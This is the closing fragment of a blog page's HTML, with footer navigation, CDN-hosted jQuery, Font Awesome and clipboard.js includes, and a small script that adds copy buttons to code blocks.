       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
